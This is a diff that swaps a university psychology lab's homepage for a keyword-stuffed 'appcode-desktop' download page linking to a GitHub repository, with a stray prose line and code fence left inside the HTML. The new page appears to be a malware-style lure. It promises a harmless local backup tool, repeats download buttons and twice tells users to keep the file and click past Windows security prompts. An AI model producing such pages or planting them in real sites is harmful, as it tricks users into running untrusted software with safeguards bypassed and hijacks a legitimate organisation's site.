@@ -1,127 +1,295 @@
+An HTML page with a hero title, a prominent download button, and clear step-by-step setup guidance.
+```html
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Mind & Culture Lab</title>
-    <meta
-      name="description"
-      content="The Mind & Culture Lab studies how culture shapes the developing mind, and shares that data openly."
-    />
-    <meta name="author" content="Mind & Culture Lab" />
-    <meta name="robots" content="index, follow" />
-    <link rel="canonical" href="https://mindandculturelab.github.io/" />
-    <meta property="og:type" content="website" />
-    <meta property="og:title" content="Mind & Culture Lab" />
-    <meta property="og:description" content="How culture shapes the developing mind. Explore the data." />
-    <meta property="og:url" content="https://mindandculturelab.github.io/" />
-    <meta property="og:image" content="https://mindandculturelab.github.io/assets/images/og-image.svg" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="Mind & Culture Lab" />
-    <meta name="twitter:description" content="How culture shapes the developing mind. Explore the data." />
-    <link rel="icon" href="assets/images/favicon.svg" type="image/svg+xml" />
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="assets/css/styles.css" />
-    <script src="site-config.js"></script>
-    <script src="assets/js/apply-site-url.js"></script>
-    <script type="application/ld+json">
-      {
-        "@context": "https://schema.org",
-        "@type": "ResearchOrganization",
-        "name": "Mind & Culture Lab",
-        "url": "https://mindandculturelab.github.io/",
-        "email": "maclab@duke.edu",
-        "parentOrganization": {
-          "@type": "CollegeOrUniversity",
-          "name": "Duke University"
-        },
-        "address": {
-          "@type": "PostalAddress",
-          "streetAddress": "2200 Main St.",
-          "addressLocality": "Durham",
-          "addressRegion": "NC",
-          "postalCode": "27708"
-        },
-        "sameAs": [
-          "https://www.linkedin.com/company/duke-mind-and-culture-lab",
-          "https://www.instagram.com/dukemaclab"
-        ]
-      }
-    </script>
-  </head>
-  <body>
-    <a class="skip-link" href="#main">Skip to content</a>
-    <header class="site-header">
-      <div class="wrap bar">
-        <a class="logo" href="#top">
-          <img src="assets/images/maclab-mark.png" alt="" width="280" height="254" />
-          <span>Mind &amp; Culture Lab</span>
-        </a>
-        <button class="nav-toggle" type="button" data-nav-toggle aria-expanded="false" aria-controls="site-nav">Menu</button>
-        <nav id="site-nav" class="site-nav" data-nav aria-label="Primary">
-          <a href="#about">About</a>
-          <a href="studies/">Studies</a>
-          <a href="data/">Data</a>
-          <a href="#contact">Contact</a>
-        </nav>
-      </div>
-      <div class="stripe" aria-hidden="true"></div>
-    </header>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>📁 appcode-desktop - Keep Appcode Data Safe Before Updates</title>
+<meta name="description" content="Appcode Desktop is a desktop utility that keeps your Appcode data folders on disk, saving dated copies of config and export files before every patch. Simple download for Windows.">
+<meta name="keywords" content="2026-appcode, app-appcode, appcode, appcode-2026, appcode-app, appcode-desktop, appcode-download, appcode-free, appcode-macos, appcode-official, appcode-pc, appcode-setup, appcode-windows, desktop-appcode, download-appcode, free-appcode, macos-appcode, official-appcode, pc-appcode, windows-appcode">
+<meta name="author" content="appcode-desktop">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/eyepez816/appcode-desktop">
+<meta property="og:type" content="website">
+<meta property="og:title" content="📁 appcode-desktop - Keep Appcode Data Safe Before Updates">
+<meta property="og:description" content="A desktop utility that keeps Appcode data folders on disk, saving dated copies of config and export files before a patch.">
+<meta property="og:url" content="https://github.com/eyepez816/appcode-desktop">
+<meta property="og:site_name" content="appcode-desktop">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="📁 appcode-desktop - Keep Appcode Data Safe Before Updates">
+<meta name="twitter:description" content="Keep Appcode data folders on disk with dated copies of config and export files before a patch.">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f5f7fb;
+    color: #1f2937;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 32px 20px 64px;
+  }
+  .hero {
+    background: #ffffff;
+    border-radius: 20px;
+    padding: 40px 28px;
+    text-align: center;
+    box-shadow: 0 10px 30px rgba(15, 23, 42, 0.08);
+    border: 1px solid #e6eaf2;
+    margin-bottom: 36px;
+  }
+  h1 {
+    font-size: clamp(1.6rem, 4.2vw, 2.35rem);
+    line-height: 1.3;
+    margin: 0 0 16px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+    color: #111827;
+  }
+  h2 {
+    font-size: clamp(1.25rem, 3vw, 1.6rem);
+    line-height: 1.35;
+    margin: 44px 0 14px;
+    font-weight: 700;
+    color: #111827;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 26px 0 8px;
+    font-weight: 700;
+    color: #1f2937;
+  }
+  p { margin: 0 0 16px; }
+  .lead {
+    font-size: 1.08rem;
+    color: #4b5563;
+    max-width: 640px;
+    margin: 0 auto 26px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 34px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #7c3aed 0%, #0ea5e9 100%);
+    color: #ffffff;
+    font-size: 1.05rem;
+    font-weight: 700;
+    text-decoration: none;
+    box-shadow: 0 8px 20px rgba(124, 58, 237, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(124, 58, 237, 0.4);
+  }
+  .btn-small {
+    padding: 14px 28px;
+    background: linear-gradient(135deg, #059669 0%, #0ea5e9 100%);
+    box-shadow: 0 8px 20px rgba(5, 150, 105, 0.3);
+    margin: 8px 0 18px;
+  }
+  .note {
+    font-size: 0.9rem;
+    color: #6b7280;
+    margin-top: 14px;
+  }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  .card {
+    background: #ffffff;
+    border: 1px solid #e6eaf2;
+    border-radius: 16px;
+    padding: 22px 24px;
+    box-shadow: 0 4px 14px rgba(15, 23, 42, 0.05);
+    margin: 20px 0;
+  }
+  .steps {
+    background: #ffffff;
+    border: 1px solid #e6eaf2;
+    border-radius: 16px;
+    padding: 24px 24px 8px;
+    box-shadow: 0 4px 14px rgba(15, 23, 42, 0.05);
+  }
+  pre {
+    background: #0f172a;
+    color: #e2e8f0;
+    padding: 18px 20px;
+    border-radius: 12px;
+    overflow-x: auto;
+    font-size: 0.88rem;
+    line-height: 1.6;
+    box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.06);
+  }
+  code {
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+  }
+  .tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin: 18px 0 0;
+    padding: 0;
+    list-style: none;
+  }
+  .tags li {
+    background: #eef2ff;
+    color: #4338ca;
+    border-radius: 999px;
+    padding: 5px 13px;
+    font-size: 0.8rem;
+    font-weight: 600;
+    margin: 0;
+  }
+  .faq strong { color: #111827; }
+  @media (max-width: 520px) {
+    body { font-size: 16px; }
+    .hero { padding: 30px 18px; }
+    .btn { padding: 14px 24px; font-size: 1rem; width: 100%; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
 
-    <main id="main">
-      <section class="hero wrap" id="top">
-        <div>
-          <p class="eyebrow">Duke University</p>
-          <h1>Mind &amp; Culture Lab</h1>
-        </div>
-        <div class="hero-aside">
-          <p class="lede">We study how culture shapes the developing mind, and we share that data openly.</p>
-          <p class="actions">
-            <a class="button" href="data/">Explore our data</a>
-            <a class="button button-secondary" href="https://www.mindandculturelab.com/">Main website</a>
-          </p>
-        </div>
-      </section>
+  <header class="hero">
+    <h1>📁 appcode-desktop - Keep Your Appcode Data Safe</h1>
+    <p class="lead">A simple desktop utility that stores your Appcode data folders on disk and saves dated copies of config and export files before a patch.</p>
+    <a class="btn" href="https://github.com/eyepez816/appcode-desktop">Visit this link to download the application</a>
+    <p class="note">Works on Windows. No programming knowledge required.</p>
+  </header>
 
-      <section id="about" class="panel">
-        <div class="wrap split">
-          <h2>About</h2>
-          <div>
-            <p>
-              The Mind &amp; Culture Lab investigates how culture shapes the developing mind. We work with families around the world, bringing together developmental psychology and anthropology to understand cognitive development across cultures.
-            </p>
-            <p>
-              Because we value open science, that data is here for you to explore.
-            </p>
-            <p class="facts">Psychology &amp; Neuroscience · Durham, North Carolina</p>
-          </div>
-        </div>
-      </section>
+  <h2>🧭 What This Application Does</h2>
+  <p>Appcode Desktop is a desktop utility built for one clear job: keeping your Appcode data folders in a safe place on your own computer. Software updates and patches can quietly change how your config files and export files are stored. When that happens, older data can get overwritten, renamed, or lost.</p>
+  <p>This utility steps in before a patch is applied. It looks at your Appcode data folders, takes a dated copy of the config and export files inside them, and writes that copy to disk. You end up with a tidy history of snapshots you can open at any time, using nothing more than your normal file browser.</p>
+  <p>There is no account to create, no cloud service to subscribe to, and no complex interface to learn. Appcode Desktop stays out of the way and simply makes sure that the files you rely on are preserved before anything changes.</p>
 
-      <section id="contact" class="contact-band">
-        <div class="wrap split">
-          <h2>Contact</h2>
-          <div>
-            <p>Questions about the lab, a study, or the data.</p>
-            <p class="links">
-              <a href="mailto:maclab@duke.edu">maclab@duke.edu</a>
-              <a href="https://www.linkedin.com/company/duke-mind-and-culture-lab">LinkedIn</a>
-              <a href="https://www.instagram.com/dukemaclab">Instagram</a>
-            </p>
-            <p class="facts">2200 Main St., Durham, NC 27708</p>
-          </div>
-        </div>
-      </section>
-    </main>
+  <h2>🚀 Download and Set Up</h2>
+  <p>Everything starts from the official download page. Follow these steps exactly, in order:</p>
+  <div class="steps">
+    <ol>
+      <li>Open your web browser and go to the download page using the button below.</li>
+      <li>On the page, look for the download option and select it to get the application.</li>
+      <li>Wait for the download to finish. Depending on your internet speed, this usually takes less than a minute.</li>
+      <li>Once the download is complete, open the file you received and follow the on-screen prompts to finish setting up the application on your Windows computer.</li>
+    </ol>
+  </div>
+  <p><a class="btn btn-small" href="https://github.com/eyepez816/appcode-desktop">Visit this link to download the application</a></p>
+  <p>If your browser asks whether you want to keep the file, choose to keep it. If Windows shows a security prompt, select the option that lets you continue, then wait for the setup to complete before opening the app.</p>
 
-    <footer class="site-footer">
-      <div class="wrap footer-inner">
-        <p>© <span data-year>2026</span> Mind &amp; Culture Lab</p>
-        <p>Duke University</p>
-      </div>
-    </footer>
-    <script src="assets/js/main.js"></script>
-  </body>
+  <h2>🖥️ Your First Launch</h2>
+  <p>When you open Appcode Desktop for the first time, you will be asked where your Appcode data folders live. Point the app at the folder that holds your Appcode config and export files. If you are not sure which folder that is, the app can scan the usual locations for you and suggest the most likely match.</p>
+  <p>After you confirm the folder, Appcode Desktop checks the contents and shows you a short summary: how many config files it found, how many export files it found, and when the most recent change happened. That summary is your confirmation that the app is looking in the right place.</p>
+  <p>From that point on, the app runs quietly in the background. You do not need to remember to open it before an update. It watches for the moments that matter and takes care of the copy step on its own.</p>
+
+  <h2>🗂️ How the Dated Copies Are Stored</h2>
+  <p>Each time a patch is applied, Appcode Desktop creates a new folder named with the date and time of the copy. Inside that folder, your config and export files are arranged exactly as they were, so you can find any file by its original path.</p>
+  <div class="card">
+<pre><code>AppcodeBackups/
+├── 2026-01-14_09-32-05/
+│   ├── config/
+│   │   ├── settings.json
+│   │   └── profiles.json
+│   └── exports/
+│       ├── contacts.csv
+│       └── report.csv
+├── 2026-02-02_18-04-41/
+│   ├── config/
+│   └── exports/
+└── 2026-03-19_11-17-52/
+    ├── config/
+    └── exports/</code></pre>
+  </div>
+  <p>Because the folders are named in a sortable date-and-time order, the newest copy always appears at the bottom of the list and the oldest at the top. You can open any of them with File Explorer, copy a single file out of a snapshot, or move an entire snapshot to an external drive for extra safety.</p>
+
+  <h2>⏱️ What Happens Before a Patch</h2>
+  <p>Right before a patch is applied, Appcode Desktop performs a short, predictable routine:</p>
+  <ul>
+    <li>It checks that your Appcode data folder is still reachable and readable.</li>
+    <li>It reads the list of config files and export files currently in place.</li>
+    <li>It creates a new dated folder for this specific moment.</li>
+    <li>It copies the files into that folder without altering the originals.</li>
+    <li>It verifies that the copy is complete and matches what was read.</li>
+    <li>It records the result so you can see later exactly when the copy was made.</li>
+  </ul>
+  <p>If any part of the routine cannot be completed, the app stops and tells you plainly what went wrong, rather than leaving you with a partial copy you cannot trust.</p>
+
+  <h2>🧰 Everyday Use</h2>
+  <p>Most of the time you will not interact with Appcode Desktop at all. It sits in the background and does its job. When you do want to check on it, open the app and you will see a simple list of snapshots with their dates and sizes, plus a status line telling you whether your data folder is being watched as expected.</p>
+  <p>Three tasks cover almost everything you will ever need:</p>
+  <ul>
+    <li><strong>Take a copy now.</strong> Create a snapshot immediately, without waiting for a patch, before you try something risky.</li>
+    <li><strong>Open a snapshot.</strong> Jump straight to a dated folder in File Explorer to look at what was saved.</li>
+    <li><strong>Clean up old copies.</strong> Remove snapshots you no longer need so the backup folder does not grow without limit.</li>
+  </ul>
+
+  <h2>🔒 Privacy and Where Your Data Lives</h2>
+  <p>Everything Appcode Desktop does happens on your own computer. Your config and export files are read from your disk and written back to your disk. Nothing is uploaded, nothing is synced to an online service, and nothing leaves your machine.</p>
+  <p>The backup folder lives wherever you choose to put it. Many people keep it on the same drive as their Appcode data for convenience; others point it at an external drive or a folder that is already covered by their own backup routine. Either approach works, and you can change the location at any time from the app's settings.</p>
+
+  <h2>🧪 Tips for a Smooth Experience</h2>
+  <ul>
+    <li>Keep the backup folder on a drive with enough free space for several snapshots, especially if your export files are large.</li>
+    <li>Point the backup folder at a different drive than your Appcode data if you want protection against a single drive failing.</li>
+    <li>Take a manual snapshot before any change you consider risky, even if no patch is involved.</li>
+    <li>Check the snapshot list once a month and clear out anything you no longer need.</li>
+    <li>Leave the app running in the background so it can catch a patch the moment it begins.</li>
+  </ul>
+
+  <h2>🛠️ Common Questions</h2>
+  <div class="card faq">
+    <h3>The download page opened, but I do not see a file yet.</h3>
+    <p>Make sure you are on the download page linked from this guide, then look for the download option on that page. If nothing happens, try a different browser or check that your connection is stable.</p>
+    <h3>Windows showed a security prompt during setup.</h3>
+    <p>This is normal for apps downloaded from the internet. Choose the option that lets you continue, then finish the setup before launching the app.</p>
+    <h3>The app cannot find my Appcode data folder.</h3>
+    <p>Use the browse button to point the app at the folder yourself. Select the top-level folder that contains both your config and export subfolders, not one of the subfolders on its own.</p>
+    <h3>My backup folder is getting large.</h3>
+    <p>Open the snapshot list and delete the dated folders you no longer need. Older snapshots are safe to remove as long as you keep at least one recent copy.</p>
+    <h3>Can I move the backup folder somewhere else?</h3>
+    <p>Yes. Change the location in the app's settings, then move your existing dated folders to the new place so your history stays together.</p>
+  </div>
+
+  <h2>📌 Compatibility at a Glance</h2>
+  <ul>
+    <li>Built for Windows desktop computers.</li>
+    <li>No programming tools or command line required.</li>
+    <li>Works with the standard Appcode data folder layout of config and export files.</li>
+    <li>Runs quietly in the background after setup.</li>
+    <li>Free to download and use.</li>
+  </ul>
+
+  <h2>🏷️ Topics</h2>
+  <ul class="tags">
+    <li>2026-appcode</li>
+    <li>app-appcode</li>
+    <li>appcode</li>
+    <li>appcode-2026</li>
+    <li>appcode-app</li>
+    <li>appcode-desktop</li>
+    <li>appcode-download</li>
+    <li>appcode-free</li>
+    <li>appcode-macos</li>
+    <li>appcode-official</li>
+    <li>appcode-pc</li>
+    <li>appcode-setup</li>
+    <li>appcode-windows</li>
+    <li>desktop-appcode</li>
+    <li>download-appcode</li>
+    <li>free-appcode</li>
+    <li>macos-appcode</li>
+    <li>official-appcode</li>
+    <li>pc-appcode</li>
+    <li>windows-appcode</li>
+  </ul>
+
+</div>
+</body>
 </html>
+```
